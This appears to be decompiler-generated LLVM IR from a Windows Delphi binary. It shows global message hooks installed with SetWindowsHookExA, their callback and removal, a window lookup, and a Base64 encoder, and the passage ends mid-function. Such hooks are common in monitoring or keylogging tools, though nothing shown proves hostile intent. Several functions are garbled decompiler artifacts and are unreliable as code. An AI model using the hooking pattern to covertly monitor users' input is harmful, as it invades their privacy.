define i32 @function_4051b0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4051b0:
  %esp.0.reg2mem = alloca i32, !insn.addr !707
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !708
  store i32 %1, i32* %stack_var_-24, align 4, !insn.addr !708
  %2 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !708
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !709
  %3 = call i32 @function_40713c(), !insn.addr !710
  %4 = icmp eq i32 %3, 0, !insn.addr !711
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !712
  br i1 %4, label %dec_label_pc_405214, label %dec_label_pc_4051d1, !insn.addr !712

dec_label_pc_4051d1:                              ; preds = %dec_label_pc_4051b0
  %5 = inttoptr i32 %0 to i8*, !insn.addr !713
  %6 = call i32* @FindWindowExA(i32* null, i32* bitcast ([9 x i8]* @global_var_405238 to i32*), i8* null, i8* %5), !insn.addr !714
  %7 = ptrtoint i32* %6 to i32, !insn.addr !714
  store i32 %7, i32* %stack_var_-44, align 4, !insn.addr !715
  %8 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !715
  %9 = call i1 @IsWindow(i32* %6), !insn.addr !716
  %10 = icmp eq i1 %9, false, !insn.addr !717
  br i1 %10, label %dec_label_pc_40520f, label %dec_label_pc_4051ec, !insn.addr !718

dec_label_pc_4051ec:                              ; preds = %dec_label_pc_4051d1
  %11 = call i32 @function_406f9c(), !insn.addr !719
  %12 = call i32 @"@LStrAsg"(), !insn.addr !720
  %13 = call i32 @function_4072c4(), !insn.addr !721
  store i32 %8, i32* %esp.0.reg2mem, !insn.addr !722
  br label %dec_label_pc_405214, !insn.addr !722

dec_label_pc_40520f:                              ; preds = %dec_label_pc_4051d1
  %14 = call i32 @function_4073f8(), !insn.addr !723
  store i32 %8, i32* %esp.0.reg2mem, !insn.addr !723
  br label %dec_label_pc_405214, !insn.addr !723

dec_label_pc_405214:                              ; preds = %dec_label_pc_40520f, %dec_label_pc_4051ec, %dec_label_pc_4051b0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %15 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !724
  %16 = load i32, i32* %15, align 4, !insn.addr !724
  call void @__writefsdword(i32 0, i32 %16), !insn.addr !725
  %17 = add i32 %esp.0.reload, 8, !insn.addr !726
  %18 = inttoptr i32 %17 to i32*, !insn.addr !726
  store i32 4215345, i32* %18, align 4, !insn.addr !726
  %19 = call i32 @"@LStrClr"(), !insn.addr !727
  ret i32 %19, !insn.addr !728
}

define i32 @function_40522a() local_unnamed_addr {
dec_label_pc_40522a:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !729
  ret i32 %0, !insn.addr !729
}

define i32 @function_40522f() local_unnamed_addr {
dec_label_pc_40522f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !730
}

define i32 @function_405231(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405231:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !731
}

define i32 @function_405235() local_unnamed_addr {
dec_label_pc_405235:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = bitcast i32* %eax to i8*
  %6 = trunc i32 %4 to i8
  %7 = mul i8 %6, 2, !insn.addr !732
  %8 = inttoptr i32 %4 to i8*, !insn.addr !732
  store i8 %7, i8* %8, align 1, !insn.addr !732
  %9 = add i32 %2, 111, !insn.addr !733
  %10 = inttoptr i32 %9 to i8*, !insn.addr !733
  %11 = load i8, i8* %10, align 1, !insn.addr !733
  %12 = load i32, i32* %eax, align 4, !insn.addr !733
  %13 = trunc i32 %12 to i8, !insn.addr !733
  %14 = add i8 %11, %13, !insn.addr !733
  store i8 %14, i8* %10, align 1, !insn.addr !733
  %15 = trunc i32 %3 to i16, !insn.addr !734
  %16 = call i32 @__asm_insd(i16 %15), !insn.addr !734
  %17 = inttoptr i32 %0 to i32*, !insn.addr !734
  store i32 %16, i32* %17, align 4, !insn.addr !734
  %18 = add i32 %0, 66, !insn.addr !735
  %19 = inttoptr i32 %18 to i64*, !insn.addr !735
  %20 = load i64, i64* %19, align 4, !insn.addr !735
  %21 = call i32 @__asm_bound(i64 %20), !insn.addr !735
  call void @__asm_outsd(i16 %15, i32 %1), !insn.addr !736
  %22 = load i8, i8* %5, align 4, !insn.addr !737
  %23 = load i32, i32* %eax, align 4
  %24 = trunc i32 %23 to i8, !insn.addr !737
  %25 = add i8 %22, %24, !insn.addr !737
  %26 = inttoptr i32 %23 to i8*, !insn.addr !737
  store i8 %25, i8* %26, align 1, !insn.addr !737
  %27 = add i32 %21, -117, !insn.addr !738
  %28 = inttoptr i32 %27 to i8*, !insn.addr !738
  %29 = load i8, i8* %28, align 1, !insn.addr !738
  %30 = trunc i32 %3 to i8, !insn.addr !738
  %31 = add i8 %29, %30, !insn.addr !738
  store i8 %31, i8* %28, align 1, !insn.addr !738
  %32 = call i8 @__asm_in(i16 %15), !insn.addr !739
  %33 = add i32 %21, 16, !insn.addr !740
  %34 = inttoptr i32 %33 to i32*, !insn.addr !740
  %35 = load i32, i32* %34, align 4, !insn.addr !740
  %36 = add i32 %21, 12, !insn.addr !741
  %37 = inttoptr i32 %36 to i32*, !insn.addr !741
  %38 = load i32, i32* %37, align 4, !insn.addr !741
  %39 = add i32 %21, 8, !insn.addr !742
  %40 = inttoptr i32 %39 to i32*, !insn.addr !742
  %41 = load i32, i32* %40, align 4, !insn.addr !742
  %42 = load i32, i32* inttoptr (i32 4227372 to i32*), align 4, !insn.addr !743
  %43 = inttoptr i32 %42 to i32*, !insn.addr !744
  %44 = load i32, i32* %43, align 4, !insn.addr !744
  %45 = icmp eq i32 %44, 0, !insn.addr !744
  %46 = icmp eq i1 %45, false, !insn.addr !745
  %47 = icmp eq i32 %41, 0, !insn.addr !746
  %48 = icmp eq i1 %47, %46
  %49 = icmp eq i32 %38, 1, !insn.addr !747
  %50 = icmp eq i1 %49, %48
  br i1 %50, label %dec_label_pc_40526b, label %dec_label_pc_40529a, !insn.addr !748

dec_label_pc_40526b:                              ; preds = %dec_label_pc_405235
  store i32 %35, i32* %eax, align 4, !insn.addr !749
  %51 = add i32 %35, 4, !insn.addr !750
  %52 = inttoptr i32 %51 to i32*, !insn.addr !750
  %53 = load i32, i32* %52, align 4, !insn.addr !750
  switch i32 %53, label %dec_label_pc_40529a [
    i32 256, label %dec_label_pc_405282
    i32 770, label %dec_label_pc_405293
  ]

dec_label_pc_405282:                              ; preds = %dec_label_pc_40526b
  %54 = call i32 @function_404fc0(i32 %2, i32 %1, i32 %0), !insn.addr !751
  br label %dec_label_pc_40529a, !insn.addr !752

dec_label_pc_405293:                              ; preds = %dec_label_pc_40526b
  %55 = call i32 @function_4050e4(i32 %2, i32 %1, i32 %0), !insn.addr !753
  br label %dec_label_pc_40529a, !insn.addr !753

dec_label_pc_40529a:                              ; preds = %dec_label_pc_405235, %dec_label_pc_40526b, %dec_label_pc_405293, %dec_label_pc_405282
  %56 = load i32, i32* @global_var_4096ac, align 4, !insn.addr !754
  %57 = inttoptr i32 %35 to i32*, !insn.addr !755
  %58 = call i32 @CallNextHookEx(i32* %57, i32 %38, i32 %41, i32 %56), !insn.addr !755
  ret i32 %58, !insn.addr !756
}

define i32 @function_4052b0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4052b0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = load i32, i32* @global_var_40812c, align 4
  %4 = icmp eq i32 %3, 0, !insn.addr !757
  %5 = icmp eq i1 %4, false, !insn.addr !758
  %6 = icmp eq i32 %arg3, 0, !insn.addr !759
  %7 = icmp eq i1 %6, %5
  br i1 %7, label %dec_label_pc_4052ce, label %dec_label_pc_4052e0, !insn.addr !760

dec_label_pc_4052ce:                              ; preds = %dec_label_pc_4052b0
  %8 = add i32 %arg1, 8, !insn.addr !761
  %9 = inttoptr i32 %8 to i32*, !insn.addr !761
  %10 = load i32, i32* %9, align 4, !insn.addr !761
  %11 = icmp eq i32 %10, 2, !insn.addr !762
  %12 = icmp eq i1 %11, false, !insn.addr !763
  br i1 %12, label %dec_label_pc_4052e0, label %dec_label_pc_4052d8, !insn.addr !763

dec_label_pc_4052d8:                              ; preds = %dec_label_pc_4052ce
  %13 = call i32 @function_4051b0(i32 %1, i32 %2, i32 %0), !insn.addr !764
  br label %dec_label_pc_4052e0, !insn.addr !764

dec_label_pc_4052e0:                              ; preds = %dec_label_pc_4052b0, %dec_label_pc_4052d8, %dec_label_pc_4052ce
  %14 = load i32, i32* @global_var_4096b0, align 4, !insn.addr !765
  %15 = inttoptr i32 %arg1 to i32*, !insn.addr !766
  %16 = call i32 @CallNextHookEx(i32* %15, i32 %arg2, i32 %arg3, i32 %14), !insn.addr !766
  ret i32 %16, !insn.addr !767
}

define i32 @function_4052f8() local_unnamed_addr {
dec_label_pc_4052f8:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %0, i32* inttoptr (i32 4215364 to i32*), i32 3), !insn.addr !768
  %2 = ptrtoint i32* %1 to i32, !insn.addr !768
  store i32 %2, i32* @global_var_4096ac, align 4, !insn.addr !769
  %3 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %4 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %3, i32* inttoptr (i32 4215472 to i32*), i32 4), !insn.addr !770
  %5 = ptrtoint i32* %4 to i32, !insn.addr !770
  store i32 %5, i32* @global_var_4096b0, align 4, !insn.addr !771
  ret i32 %5, !insn.addr !772
}

define i32 @function_405330() local_unnamed_addr {
dec_label_pc_405330:
  %0 = load i32, i32* @global_var_4096ac, align 4, !insn.addr !773
  %1 = inttoptr i32 %0 to i32*, !insn.addr !774
  %2 = call i1 @UnhookWindowsHookEx(i32* %1), !insn.addr !774
  %3 = load i32, i32* @global_var_4096b0, align 4, !insn.addr !775
  %4 = inttoptr i32 %3 to i32*, !insn.addr !776
  %5 = call i1 @UnhookWindowsHookEx(i32* %4), !insn.addr !776
  %6 = sext i1 %5 to i32, !insn.addr !776
  ret i32 %6, !insn.addr !777
}

define i32 @function_405348() local_unnamed_addr {
dec_label_pc_405348:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !778
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !778
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !778
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !779
  %2 = load i32, i32* @global_var_4096a8, align 4, !insn.addr !780
  %3 = add i32 %2, 1, !insn.addr !780
  store i32 %3, i32* @global_var_4096a8, align 4, !insn.addr !780
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !781
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !782
  ret i32 0, !insn.addr !783
}

define i32 @function_40536d() local_unnamed_addr {
dec_label_pc_40536d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !784
  ret i32 %0, !insn.addr !784
}

define i32 @function_405372() local_unnamed_addr {
dec_label_pc_405372:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !785
}

define i32 @function_405374(i32 %arg1) local_unnamed_addr {
dec_label_pc_405374:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !786
}

define i32 @function_405378() local_unnamed_addr {
dec_label_pc_405378:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a8, align 4, !insn.addr !787
  %2 = add i32 %1, -1, !insn.addr !787
  store i32 %2, i32* @global_var_4096a8, align 4, !insn.addr !787
  ret i32 %0, !insn.addr !788
}

define i32 @function_405383(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405383:
  %storemerge.reg2mem = alloca i32, !insn.addr !789
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %4 = add i32 %3, 1, !insn.addr !789
  %5 = inttoptr i32 %3 to i32*, !insn.addr !789
  store i32 %4, i32* %5, align 4, !insn.addr !789
  %6 = bitcast i32* %eax to i8*
  %7 = load i8, i8* %6, align 4, !insn.addr !790
  %8 = load i32, i32* %eax, align 4
  %9 = trunc i32 %8 to i8, !insn.addr !790
  %10 = add i8 %7, %9, !insn.addr !790
  %11 = inttoptr i32 %8 to i8*, !insn.addr !790
  store i8 %10, i8* %11, align 1, !insn.addr !790
  %12 = load i32, i32* %eax, align 4, !insn.addr !791
  store i32 %arg1, i32* %eax, align 4, !insn.addr !792
  %13 = add i32 %12, 99, !insn.addr !793
  %14 = inttoptr i32 %13 to i64*, !insn.addr !793
  %15 = load i64, i64* %14, align 4, !insn.addr !793
  %16 = call i32 @__asm_bound(i64 %15), !insn.addr !793
  %17 = add i32 %16, -2, !insn.addr !794
  %18 = inttoptr i32 %17 to i16*, !insn.addr !794
  store i16 27241, i16* %18, align 2, !insn.addr !794
  %19 = mul i32 %2, 2, !insn.addr !795
  %20 = add i32 %2, 110, !insn.addr !795
  %21 = add i32 %20, %19, !insn.addr !795
  %22 = inttoptr i32 %21 to i32*, !insn.addr !795
  %23 = load i32, i32* %22, align 4, !insn.addr !795
  %24 = sext i32 %23 to i64, !insn.addr !795
  %25 = mul nsw i64 %24, 111, !insn.addr !795
  %26 = mul i64 %24, 476741369856
  %27 = sdiv i64 %26, 4294967296, !insn.addr !795
  %28 = icmp eq i64 %25, %27, !insn.addr !795
  br i1 %28, label %dec_label_pc_4053b5, label %dec_label_pc_405424, !insn.addr !796

dec_label_pc_4053b5:                              ; preds = %dec_label_pc_405383
  %29 = icmp eq i32 %0, 0, !insn.addr !797
  br i1 %29, label %dec_label_pc_40542c, label %dec_label_pc_4053b9, !insn.addr !798

dec_label_pc_4053b9:                              ; preds = %dec_label_pc_4053b5
  %30 = icmp slt i32 %0, 0, !insn.addr !797
  br i1 %30, label %dec_label_pc_405434, label %dec_label_pc_4053bb, !insn.addr !799

dec_label_pc_4053bb:                              ; preds = %dec_label_pc_4053b9
  %31 = trunc i32 %0 to i8, !insn.addr !797
  %32 = call i8 @llvm.ctpop.i8(i8 %31), !range !544, !insn.addr !797
  %33 = and i8 %32, 1, !insn.addr !797
  %34 = icmp eq i8 %33, 0, !insn.addr !797
  br i1 %34, label %dec_label_pc_4053ed, label %dec_label_pc_4053bd, !insn.addr !800

dec_label_pc_4053bd:                              ; preds = %dec_label_pc_4053bb
  %35 = add i32 %12, -1, !insn.addr !791
  %36 = inttoptr i32 %arg3 to i32*, !insn.addr !801
  %37 = load i32, i32* %36, align 4, !insn.addr !801
  %38 = xor i32 %37, %1, !insn.addr !801
  store i32 %38, i32* %36, align 4, !insn.addr !801
  %39 = add i32 %1, 959985462, !insn.addr !802
  %40 = inttoptr i32 %39 to i32*, !insn.addr !802
  %41 = load i32, i32* %40, align 4, !insn.addr !802
  %42 = xor i32 %41, %1, !insn.addr !802
  %43 = add i32 %16, -38, !insn.addr !803
  %44 = inttoptr i32 %43 to i32*, !insn.addr !803
  store i32 %35, i32* %44, align 4, !insn.addr !803
  %45 = add i32 %16, -42, !insn.addr !804
  %46 = inttoptr i32 %45 to i32*, !insn.addr !804
  store i32 %42, i32* %46, align 4, !insn.addr !804
  %47 = add i32 %16, -22, !insn.addr !805
  %48 = inttoptr i32 %47 to i32*, !insn.addr !805
  store i32 0, i32* %48, align 4, !insn.addr !805
  %49 = add i32 %16, -26, !insn.addr !806
  %50 = inttoptr i32 %49 to i32*, !insn.addr !806
  store i32 0, i32* %50, align 4, !insn.addr !806
  %51 = add i32 %16, -30, !insn.addr !807
  %52 = inttoptr i32 %51 to i32*, !insn.addr !807
  store i32 0, i32* %52, align 4, !insn.addr !807
  %53 = add i32 %16, -34, !insn.addr !808
  %54 = inttoptr i32 %53 to i32*, !insn.addr !808
  store i32 0, i32* %54, align 4, !insn.addr !808
  %55 = add i32 %16, -6, !insn.addr !809
  %56 = inttoptr i32 %55 to i32*, !insn.addr !809
  store i32 %arg3, i32* %56, align 4, !insn.addr !809
  %57 = add i32 %16, -46, !insn.addr !810
  %58 = inttoptr i32 %57 to i32*, !insn.addr !810
  store i32 %17, i32* %58, align 4, !insn.addr !810
  ret i32 0, !insn.addr !810

dec_label_pc_4053ed:                              ; preds = %dec_label_pc_4053bb
  %59 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !811
  %60 = trunc i64 %25 to i32, !insn.addr !795
  %61 = load i32, i32* %eax, align 4, !insn.addr !812
  %62 = add i32 %61, 1, !insn.addr !812
  %63 = mul i32 %59, 8, !insn.addr !813
  %64 = add i32 %59, 48, !insn.addr !813
  %65 = add i32 %64, %63, !insn.addr !813
  %66 = inttoptr i32 %65 to i8*, !insn.addr !813
  %67 = load i8, i8* %66, align 4, !insn.addr !813
  %68 = udiv i32 %62, 256, !insn.addr !813
  %69 = trunc i32 %68 to i8, !insn.addr !813
  %70 = add i8 %67, %69, !insn.addr !813
  store i8 %70, i8* %66, align 4, !insn.addr !813
  call void @__writefsdword(i32 %62, i32 %17), !insn.addr !814
  %71 = call i32 @"@LStrClr"(), !insn.addr !815
  %72 = call i32 @function_4034c8(), !insn.addr !816
  %73 = add i32 %60, -8, !insn.addr !817
  %74 = inttoptr i32 %73 to i32*, !insn.addr !817
  store i32 %72, i32* %74, align 4, !insn.addr !817
  %75 = ashr i32 %72, 31, !insn.addr !818
  %76 = zext i32 %72 to i64, !insn.addr !819
  %77 = zext i32 %75 to i64, !insn.addr !819
  %78 = mul i64 %77, 4294967296, !insn.addr !819
  %79 = or i64 %78, %76, !insn.addr !819
  %80 = sdiv i64 %79, 3, !insn.addr !819
  %81 = trunc i64 %80 to i32, !insn.addr !819
  store i32 %81, i32* %eax, align 4, !insn.addr !819
  %82 = srem i64 %79, 3, !insn.addr !819
  %83 = trunc i64 %82 to i32, !insn.addr !819
  %84 = icmp eq i32 %83, 0, !insn.addr !820
  %85 = icmp eq i1 %84, false, !insn.addr !821
  br i1 %85, label %dec_label_pc_405423, label %dec_label_pc_405416, !insn.addr !821

dec_label_pc_405416:                              ; preds = %dec_label_pc_4053ed
  %86 = load i32, i32* %74, align 4, !insn.addr !822
  %87 = ashr i32 %86, 31, !insn.addr !823
  %88 = zext i32 %86 to i64, !insn.addr !824
  %89 = zext i32 %87 to i64, !insn.addr !824
  %90 = mul i64 %89, 4294967296, !insn.addr !824
  %91 = or i64 %90, %88, !insn.addr !824
  %92 = sdiv i64 %91, 3, !insn.addr !824
  %93 = trunc i64 %92 to i32, !insn.addr !824
  store i32 %93, i32* %storemerge.reg2mem, !insn.addr !825
  br label %dec_label_pc_405430, !insn.addr !825

dec_label_pc_405423:                              ; preds = %dec_label_pc_4053ed
  ret i32 %81, !insn.addr !825

dec_label_pc_405424:                              ; preds = %dec_label_pc_405383
  %94 = load i32, i32* %eax, align 4, !insn.addr !826
  ret i32 %94, !insn.addr !826

dec_label_pc_40542c:                              ; preds = %dec_label_pc_4053b5
  %95 = load i32, i32* %eax, align 4, !insn.addr !827
  %96 = zext i32 %95 to i64, !insn.addr !827
  %97 = zext i32 %arg3 to i64, !insn.addr !827
  %98 = mul i64 %97, 4294967296, !insn.addr !827
  %99 = or i64 %98, %96, !insn.addr !827
  %100 = zext i32 %arg2 to i64, !insn.addr !827
  %101 = sdiv i64 %99, %100, !insn.addr !827
  %102 = trunc i64 %101 to i32, !insn.addr !827
  %103 = add i32 %102, 1, !insn.addr !828
  store i32 %103, i32* %storemerge.reg2mem, !insn.addr !828
  br label %dec_label_pc_405430, !insn.addr !828

dec_label_pc_405430:                              ; preds = %dec_label_pc_405416, %dec_label_pc_40542c
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  %104 = add i32 %storemerge.reload, -1, !insn.addr !829
  ret i32 %104, !insn.addr !830

dec_label_pc_405434:                              ; preds = %dec_label_pc_4053b9
  %105 = inttoptr i32 %1 to i32*, !insn.addr !831
  %106 = load i32, i32* %105, align 4, !insn.addr !831
  store i32 %106, i32* %stack_var_-16, align 4, !insn.addr !831
  %107 = load i32, i32* %eax, align 4
  %108 = inttoptr i32 %107 to i32*, !insn.addr !832
  %109 = load i32, i32* %108, align 4, !insn.addr !832
  %110 = add i32 %109, %107, !insn.addr !832
  store i32 %110, i32* %108, align 4, !insn.addr !832
  %111 = load i32, i32* %eax, align 4
  %112 = add i32 %111, -119, !insn.addr !833
  %113 = inttoptr i32 %112 to i8*, !insn.addr !833
  %114 = load i8, i8* %113, align 1, !insn.addr !833
  %115 = trunc i32 %111 to i8, !insn.addr !833
  %116 = add i8 %114, %115, !insn.addr !833
  store i8 %116, i8* %113, align 1, !insn.addr !833
  %117 = load i32, i32* %eax, align 4, !insn.addr !834
  ret i32 %117, !insn.addr !834
}

define i32 @function_40543c() local_unnamed_addr {
dec_label_pc_40543c:
  %ebx.0.reg2mem = alloca i32, !insn.addr !835
  %esp.0.reg2mem = alloca i32, !insn.addr !835
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = add i32 %1, -8, !insn.addr !836
  %3 = inttoptr i32 %2 to i32*, !insn.addr !836
  %4 = add i32 %1, -9
  %5 = inttoptr i32 %4 to i8*
  %6 = add i32 %1, -10
  %7 = inttoptr i32 %6 to i8*
  %8 = add i32 %1, -11
  %9 = inttoptr i32 %8 to i8*
  %10 = add i32 %1, -12
  %11 = inttoptr i32 %10 to i8*
  %12 = add i32 %1, -4, !insn.addr !837
  %13 = inttoptr i32 %12 to i32*, !insn.addr !837
  %14 = add i32 %1, -20
  %15 = inttoptr i32 %14 to i32*
  %16 = add i32 %1, -24
  %17 = inttoptr i32 %16 to i32*
  %18 = add i32 %1, -28
  %19 = inttoptr i32 %18 to i32*
  %20 = add i32 %1, -32
  %21 = inttoptr i32 %20 to i32*
  %22 = add i32 %1, -16
  %23 = inttoptr i32 %22 to i32*
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !835
  br label %dec_label_pc_40543e, !insn.addr !835

dec_label_pc_40543e:                              ; preds = %dec_label_pc_405589, %dec_label_pc_40543c
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %24 = mul i32 %ebx.0.reload, 3, !insn.addr !838
  %25 = add i32 %24, 3, !insn.addr !839
  %26 = load i32, i32* %3, align 4, !insn.addr !836
  %27 = icmp sgt i32 %25, %26, !insn.addr !840
  br i1 %27, label %dec_label_pc_4054de, label %dec_label_pc_40544f, !insn.addr !840

dec_label_pc_40544f:                              ; preds = %dec_label_pc_40543e
  %28 = add i32 %24, %0, !insn.addr !841
  %29 = inttoptr i32 %28 to i8*, !insn.addr !841
  %30 = load i8, i8* %29, align 1, !insn.addr !841
  %31 = udiv i8 %30, 4
  %32 = zext i8 %31 to i32, !insn.addr !842
  %33 = add i32 %32, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !843
  %34 = inttoptr i32 %33 to i8*, !insn.addr !843
  %35 = load i8, i8* %34, align 1, !insn.addr !843
  store i8 %35, i8* %5, align 1, !insn.addr !844
  %36 = load i8, i8* %29, align 1, !insn.addr !845
  %37 = mul i8 %36, 16, !insn.addr !846
  %38 = and i8 %37, 48, !insn.addr !847
  %39 = add i32 %28, 1, !insn.addr !848
  %40 = inttoptr i32 %39 to i8*, !insn.addr !848
  %41 = load i8, i8* %40, align 1, !insn.addr !848
  %42 = udiv i8 %41, 16
  %43 = or i8 %42, %38, !insn.addr !849
  %44 = zext i8 %43 to i32, !insn.addr !849
  %45 = add i32 %44, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !850
  %46 = inttoptr i32 %45 to i8*, !insn.addr !850
  %47 = load i8, i8* %46, align 1, !insn.addr !850
  store i8 %47, i8* %7, align 1, !insn.addr !851
  %48 = load i8, i8* %40, align 1, !insn.addr !852
  %49 = mul i8 %48, 4, !insn.addr !853
  %50 = and i8 %49, 60, !insn.addr !854
  %51 = add i32 %28, 2, !insn.addr !855
  %52 = inttoptr i32 %51 to i8*, !insn.addr !855
  %53 = load i8, i8* %52, align 1, !insn.addr !855
  %54 = udiv i8 %53, 64, !insn.addr !856
  %55 = or i8 %54, %50, !insn.addr !857
  %56 = zext i8 %55 to i32, !insn.addr !857
  %57 = add i32 %56, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !858
  %58 = inttoptr i32 %57 to i8*, !insn.addr !858
  %59 = load i8, i8* %58, align 1, !insn.addr !858
  store i8 %59, i8* %9, align 1, !insn.addr !859
  %60 = and i8 %53, 63, !insn.addr !860
  %61 = zext i8 %60 to i32, !insn.addr !860
  %62 = add i32 %61, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !861
  %63 = inttoptr i32 %62 to i8*, !insn.addr !861
  %64 = load i8, i8* %63, align 1, !insn.addr !861
  store i8 %64, i8* %11, align 1, !insn.addr !862
  br label %dec_label_pc_405589, !insn.addr !863

dec_label_pc_4054de:                              ; preds = %dec_label_pc_40543e
  %65 = add i32 %24, 2, !insn.addr !864
  %66 = icmp sgt i32 %65, %26, !insn.addr !865
  %67 = add i32 %24, %0
  %68 = inttoptr i32 %67 to i8*
  %69 = load i8, i8* %68, align 1
  %70 = udiv i8 %69, 4
  %71 = zext i8 %70 to i32
  %72 = add i32 %71, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32)
  %73 = inttoptr i32 %72 to i8*
  %74 = load i8, i8* %73, align 1
  store i8 %74, i8* %5, align 1
  %75 = load i8, i8* %68, align 1
  br i1 %66, label %dec_label_pc_40554d, label %dec_label_pc_4054e8, !insn.addr !865

dec_label_pc_4054e8:                              ; preds = %dec_label_pc_4054de
  %76 = mul i8 %75, 16, !insn.addr !866
  %77 = and i8 %76, 48, !insn.addr !867
  %78 = add i32 %67, 1, !insn.addr !868
  %79 = inttoptr i32 %78 to i8*, !insn.addr !868
  %80 = load i8, i8* %79, align 1, !insn.addr !868
  %81 = zext i8 %80 to i32, !insn.addr !868
  %82 = udiv i8 %80, 16, !insn.addr !869
  %83 = or i8 %82, %77, !insn.addr !870
  %84 = zext i8 %83 to i32, !insn.addr !870
  %85 = add i32 %84, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !871
  %86 = inttoptr i32 %85 to i8*, !insn.addr !871
  %87 = load i8, i8* %86, align 1, !insn.addr !871
  store i8 %87, i8* %7, align 1, !insn.addr !872
  %88 = mul i32 %81, 4, !insn.addr !873
  %89 = and i32 %88, 60, !insn.addr !874
  %90 = add i32 %89, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !875
  %91 = inttoptr i32 %90 to i8*, !insn.addr !875
  %92 = load i8, i8* %91, align 4, !insn.addr !875
  store i8 %92, i8* %9, align 1, !insn.addr !876
  store i8 61, i8* %11, align 1, !insn.addr !877
  br label %dec_label_pc_405589, !insn.addr !878

dec_label_pc_40554d:                              ; preds = %dec_label_pc_4054de
  %93 = zext i8 %75 to i32, !insn.addr !879
  %94 = mul i32 %93, 16, !insn.addr !880
  %95 = and i32 %94, 48, !insn.addr !881
  %96 = add i32 %95, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !882
  %97 = inttoptr i32 %96 to i8*, !insn.addr !882
  %98 = load i8, i8* %97, align 16, !insn.addr !882
  store i8 %98, i8* %7, align 1, !insn.addr !883
  store i8 61, i8* %9, align 1, !insn.addr !884
  store i8 61, i8* %11, align 1, !insn.addr !885
  br label %dec_label_pc_405589, !insn.addr !885

dec_label_pc_405589:                              ; preds = %dec_label_pc_40554d, %dec_label_pc_4054e8, %dec_label_pc_40544f
  %99 = load i32, i32* %13, align 4, !insn.addr !837
  %100 = inttoptr i32 %99 to i32*, !insn.addr !886
  %101 = load i32, i32* %100, align 4, !insn.addr !886
  %102 = add i32 %esp.0.reload, -4, !insn.addr !886
  %103 = inttoptr i32 %102 to i32*, !insn.addr !886
  store i32 %101, i32* %103, align 4, !insn.addr !886
  %104 = call i32 @"@LStrFromChar"(), !insn.addr !887
  %105 = load i32, i32* %15, align 4, !insn.addr !888
  %106 = add i32 %esp.0.reload, -8, !insn.addr !888
  %107 = inttoptr i32 %106 to i32*, !insn.addr !888
  store i32 %105, i32* %107, align 4, !insn.addr !888
  %108 = call i32 @"@LStrFromChar"(), !insn.addr !889
  %109 = load i32, i32* %17, align 4, !insn.addr !890
  %110 = add i32 %esp.0.reload, -12, !insn.addr !890
  %111 = inttoptr i32 %110 to i32*
  store i32 %109, i32* %111, align 4, !insn.addr !890
  %112 = call i32 @"@LStrFromChar"(), !insn.addr !891
  %113 = load i32, i32* %19, align 4, !insn.addr !892
  %114 = add i32 %esp.0.reload, -16, !insn.addr !892
  %115 = inttoptr i32 %114 to i32*, !insn.addr !892
